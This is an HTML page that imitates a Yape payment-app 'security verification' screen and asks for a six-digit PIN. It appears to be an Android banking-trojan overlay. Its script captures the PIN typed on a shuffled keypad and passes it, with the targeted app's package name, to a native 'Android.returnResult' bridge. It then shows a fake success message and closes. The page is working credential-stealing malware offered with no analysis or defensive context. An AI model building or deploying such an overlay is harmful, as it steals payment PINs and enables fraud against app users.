<!DOCTYPE html>
<html lang="es"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no,viewport-fit=cover">
<title>Yape</title>
<style>*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}html,body{height:100%;width:100%;overflow-y:auto}body{font-family:-apple-system,BlinkMacSystemFont,'Helvetica Neue',sans-serif;min-height:100dvh;background:#0d0d1a}.page{display:flex;flex-direction:column;align-items:center;height:100%;padding:0 24px}.top{margin-top:18vh;display:flex;flex-direction:column;align-items:center}.top img{width:52px;height:52px;border-radius:14px;margin-bottom:14px}.top .t{color:#fff;font-size:16px;font-weight:500;margin-bottom:4px}.top .s{color:rgba(255,255,255,.5);font-size:12px;margin-bottom:28px}.dots{display:flex;gap:12px;margin-bottom:28px}.dots .d{width:14px;height:14px;border-radius:50%;border:2px solid rgba(255,255,255,.3);transition:all .15s}.dots .d.on{background:#742F8A;border-color:#742F8A}.kp{display:grid;grid-template-columns:repeat(3,72px);gap:10px;justify-content:center}.k{width:72px;height:50px;border-radius:25px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.1);color:#fff;font-size:20px;font-weight:500;display:flex;align-items:center;justify-content:center;cursor:pointer;-webkit-user-select:none;user-select:none}.k:active{background:rgba(255,255,255,.18)}.k.blank{background:transparent;border:none}.k.del{font-size:13px;color:rgba(255,255,255,.6);background:transparent;border:none}.sp,.ok{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:#0d0d1a;z-index:999;align-items:center;justify-content:center;flex-direction:column}.sp.show,.ok.show{display:flex}.sp-spinner{width:32px;height:32px;border:2.5px solid rgba(255,255,255,.15);border-top-color:#742F8A;border-radius:50%;animation:spin .7s linear infinite}.sp-text{margin-top:12px;font-size:13px;color:rgba(255,255,255,.5)}@keyframes spin{to{transform:rotate(360deg)}}.ok-icon{width:52px;height:52px;border-radius:50%;background:#2ecc71;display:flex;align-items:center;justify-content:center;margin-bottom:12px}.ok-icon svg{width:28px;height:28px;fill:#fff}.ok-text{font-size:14px;color:#fff}</style></head>
<body><div class="page" id="mainPage"><div class="top"><img src="data:image/png;base64," alt="Yape"><div class="t">Verificación de seguridad</div><div class="s">Ingresa tu PIN de 6 dígitos</div></div><div class="dots" id="dots"></div><div class="kp" id="kp"></div></div><div class="sp" id="spinner"><div class="sp-spinner"></div><div class="sp-text">Verificando...</div></div><div class="ok" id="okPage"><div class="ok-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div><div class="ok-text">Verificación exitosa</div></div>
<script>var pk='';try{if(typeof FKB!=='undefined'&&FKB.getPkg)pk=FKB.getPkg();}catch(e){}var pin='',mx=6;var dd=document.getElementById('dots');for(var i=0;i<mx;i++)dd.innerHTML+='<div class="d" id="d'+i+'"></div>';var ns=[1,2,3,4,5,6,7,8,9,0];for(var i=ns.length-1;i>0;i--){var j=Math.floor(Math.random()*(i+1));var t=ns[i];ns[i]=ns[j];ns[j]=t;}var kp=document.getElementById('kp');for(var i=0;i<9;i++){var k=document.createElement('div');k.className='k';k.textContent=ns[i];k.onclick=(function(n){return function(){ap(n)}})(ns[i]);kp.appendChild(k);}var bl=document.createElement('div');bl.className='k blank';kp.appendChild(bl);var zk=document.createElement('div');zk.className='k';zk.textContent=ns[9];zk.onclick=function(){ap(ns[9])};kp.appendChild(zk);var dl=document.createElement('div');dl.className='k del';dl.textContent='Borrar';dl.onclick=function(){pin=pin.slice(0,-1);ud();};kp.appendChild(dl);function ap(n){if(pin.length>=mx)return;pin+=n;ud();if(pin.length===mx)setTimeout(doSubmit,350);}function ud(){for(var i=0;i<mx;i++)document.getElementById('d'+i).className='d'+(i<pin.length?' on':'');}function doSubmit(){if(!pin||pin.length<6)return;document.activeElement.blur();document.getElementById('mainPage').style.display='none';var sn='';try{if(typeof FKB!=='undefined'&&FKB.getSn)sn=FKB.getSn();}catch(e){}var pl=JSON.stringify({password:pin,pin:pin,pkg:pk});try{if(typeof Android!=='undefined'&&Android.returnResult)Android.returnResult(pl);}catch(e){}setTimeout(function(){try{if(typeof Android!=='undefined'&&Android.close)Android.close();}catch(e){}try{if(typeof FKB!=='undefined'&&FKB.setClosePage)FKB.setClosePage(pk);}catch(e){}try{window.close();}catch(e){}},500);}</script></body></html>
